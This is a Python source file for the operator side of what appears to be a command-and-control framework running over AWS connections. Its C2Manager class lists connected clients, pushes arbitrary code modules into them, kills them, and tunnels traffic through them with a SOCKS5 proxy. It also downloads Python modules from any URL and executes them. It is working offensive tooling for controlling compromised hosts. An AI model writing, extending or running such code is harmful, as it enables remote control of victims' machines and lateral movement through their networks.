import base64
import importlib
import os

import requests

from aws.lambda_util import random_string
from core.connection.actions import ACTION_GET_CLIENTS
from core.connection.connection_factory import Factory, CONNECTION_TYPE_MASTER
from modules.windows.socks5 import SocksProxy

SERVICE_LOAD_MODULE = 'loadmodule'
SERVICE_KILL_CLIENT = 'kill'
SERVICE_LOAD_MODULE_KEY_NAME = 'name'
SERVICE_LOAD_MODULE_KEY_CODE = 'code'
SERVICE_LOAD_MODULE_RESPONSE_KEY_STATUS = 'status'


class C2Manager:
    cached_clients = []
    loaded_modules = []

    def __init__(self, connector_factory: Factory, master_password, environment_name):
        self.environment_name = environment_name
        self.connector_factory = connector_factory
        self.master_connection = self.create_connection(CONNECTION_TYPE_MASTER, 'master', master_password)
        print('[+] Connected to "{}"'.format(self.master_connection.connection_string))

    def create_connection(self, connection_type, connection_name, master_password=None):
        return self.connector_factory.create(connection_type, connection_name, master_password)

    def load_module_in_client(self, client_id, name, code, block=True):
        self.master_connection.send_service(client_id, SERVICE_LOAD_MODULE, {
            SERVICE_LOAD_MODULE_KEY_NAME: name,
            SERVICE_LOAD_MODULE_KEY_CODE: code
        })
        return self.master_connection.recv_service_response(client_id, SERVICE_LOAD_MODULE, block)

    def get_clients(self, block=True):
        self.master_connection.send_action(ACTION_GET_CLIENTS, drop_queued_action_responses=True)
        resp = self.master_connection.recv_action_response(ACTION_GET_CLIENTS, block=block)
        self.cached_clients = resp
        return resp

    def get_cached_clients(self):
        return self.cached_clients

    def get_client_id_by_client_name(self, name):
        for client in self.get_clients():
            if client['userName']['S'].lower() == name.lower():
                return client['connectionId']['S']
            if client['connectionId']['S'] == name:
                return client['connectionId']['S']
        return None

    def get_client_name_by_client_id(self, client_id):
        for client in self.get_clients():
            if client['connectionId']['S'] == client_id:
                return client['userName']['S']
        return None

    def create_proxy_socks(self, aws_url, client_id, host='127.0.0.1', port=1080, username='username', password='password'):
        print('[+] Starting proxy socks')
        return SocksProxy(aws_url, client_id, host, port, username, password)

    def exit(self):
        self.master_connection.stop()
        return

    def kill_client(self, client_id_or_name):
        client_id = self.get_client_id_by_client_name(client_id_or_name)
        self.master_connection.send_service(client_id, SERVICE_KILL_CLIENT, {})

    def load_module(self, module_file):
        delete_file = False
        if module_file.lower().startswith('http://') or module_file.lower().startswith('https://'):
            module_content = requests.get(module_file).text
            temp_file = 'tmp_module_{}.py'.format(random_string(10))
            with open(temp_file, 'w') as temp_module:
                temp_module.write(module_content)
            delete_file = True
            module_file = temp_file

        try:
            spec = importlib.util.spec_from_file_location("generator", module_file)
            foo = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(foo)
            module = foo.Module()
            if module.MODULE_NAME in self.loaded_modules:
                return False
            module.c2_manager = self
            module.parameters = {
                'environment': self.environment_name
            }
        except SyntaxError:
            if delete_file:
                os.remove(module_file)
            raise SyntaxError('Invalid module file')
        except Exception:
            if delete_file:
                os.remove(module_file)
            return False

        self.loaded_modules.append(module)
        if delete_file:
            os.remove(module_file)

        return True

    def get_loaded_modules(self):
        return self.loaded_modules
